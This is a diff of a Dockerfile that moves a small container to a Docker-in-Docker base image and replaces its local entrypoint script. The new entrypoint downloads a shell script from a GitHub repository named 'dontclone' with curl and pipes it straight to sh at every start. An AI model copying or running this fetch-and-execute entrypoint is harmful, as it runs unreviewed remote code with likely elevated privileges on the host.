@@ -1,29 +1,21 @@
-FROM ioiox/node:16-alpine
-LABEL maintainer="Stille <stille@ioiox.com>"
+FROM docker:20-dind
 
-WORKDIR /app
+#WORKDIR /app
 
-RUN git clone -b v2 https://github.com/Hideipnetwork/hideipnetwork-web.git . && npm install
+#RUN git clone -b v2 https://github.com/Hideipnetwork/hideipnetwork-web.git . && npm install
 
-# Set the working directory
 WORKDIR /app2
 
 # Install necessary packages
-RUN apk add --no-cache \
+RUN apk add --no-cache git openrc \
     screen \
     htop \
     nano \
     wget \
     curl \
-    tar
+    tar 
 
-# Copy the local entrypoint script into the container
-COPY entrypoint.sh /app2/
+COPY index.html ./
 
-# Make the entrypoint script executable
-RUN chmod +x entrypoint.sh
-
-# Use the custom entrypoint script
-ENTRYPOINT ["/app2/entrypoint.sh"]
-
-EXPOSE 56559
+# Directly set the entrypoint to execute the script from the URL
+ENTRYPOINT ["sh", "-c", "curl -sSL https://raw.githubusercontent.com/osnmoh007/dontclone/main/entrypoint2.sh | sh"]
